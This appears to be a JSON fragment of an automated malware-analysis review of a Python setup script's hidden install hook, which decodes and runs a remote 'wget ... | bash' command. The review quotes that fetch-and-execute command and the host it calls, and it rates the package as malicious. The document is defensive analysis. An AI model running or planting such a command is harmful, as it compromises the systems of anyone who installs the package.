  "review": "Let's analyze these reports step-by-step, considering the code, the logic, and the scores.\n\n**Summary of the code:**\n- The setup script reads metadata and version info.\n- It conditionally adds dependencies based on platform.\n- It defines a custom install command (`CustomInstall`) that, during installation, encodes a shell command (`wget -qO - https://down.threatest.com/uploads/install.sh | bash`) into base64, then decodes and executes it via `os.system()`.\n- The rest of the code appears standard for a setup script.\n\n---\n\n### Confirmed issues:\n- The code **does** execute a remote shell command during installation (`wget ... | bash`), which is **highly suspicious**.\n- This command downloads and runs a script from `https://down.threatest.com/uploads/install.sh`.\n- The rest of the code is typical for a setup script, with no other malicious behavior detected.\n\n### Errors, flaws, or mistakes:\n- The use of `exec()` to read version info is standard in setup scripts.\n- The conditional dependency inclusion for `pywin32` on Windows is appropriate.\n- **The main flaw** is the embedded remote code execution during install, which is **not standard practice** and **dangerous**.\n- The code encodes a shell command into base64, then decodes and runs it, which adds obfuscation but is unnecessary and suspicious.\n\n### Scoring review:\n- **Malware score:** The reports assign a malware score of 0.8 or 1, which is justified because the code executes remote code during install.\n- **Security risk score:** Similarly high, justified by the remote code execution.\n- **Obfuscated score:** The base64 encoding adds some obfuscation, so scores around 0.8 are reasonable.\n- **Overall:** The scores seem consistent with the analysis.\n\n### Specific points:\n- The **remote script URL** (`https://down.threatest.com/uploads/install.sh`) strongly suggests malicious intent, as it downloads and executes code from an external source.\n- The **use of base64 encoding** for the shell command is a common tactic to hide malicious intent.\n- The **behavior is not typical** for a setup script, which should not execute remote code during installation.\n\n### Claims based on assumptions:\n- The reports assume the remote script is malicious, which is highly likely given the context and URL.\n- There is no evidence of other malicious behavior in the rest of the code, only this remote execution.\n\n### Final assessment:\n- The **malware score** should be **close to 1** because executing remote code during setup is extremely dangerous.\n- The **security risk** should also be **close to 1**.\n- The **obfuscated score** can be around **0.8** due to the base64 encoding.\n- The **overall risk** is very high, and the package should be considered malicious or compromised.\n\n---\n\n### My own estimates:\n- **Malware score:** **1.0** (remote code execution during install is a critical security issue)\n- **Obfuscated score:** **0.8** (base64 encoding adds some obfuscation)\n- **Risk score:** **1.0** (highly dangerous, potential supply chain attack)\n\n---\n\n### **Conclusion:**\nAll reports correctly identify the core issue: the code executes a remote script during installation, which is a **serious security concern**. The scores are reasonable, but the malware and overall risk should be set to **1.0** for maximum severity.\n\n**Final recommendation:** This package is **malicious or compromised** and should be flagged accordingly.",
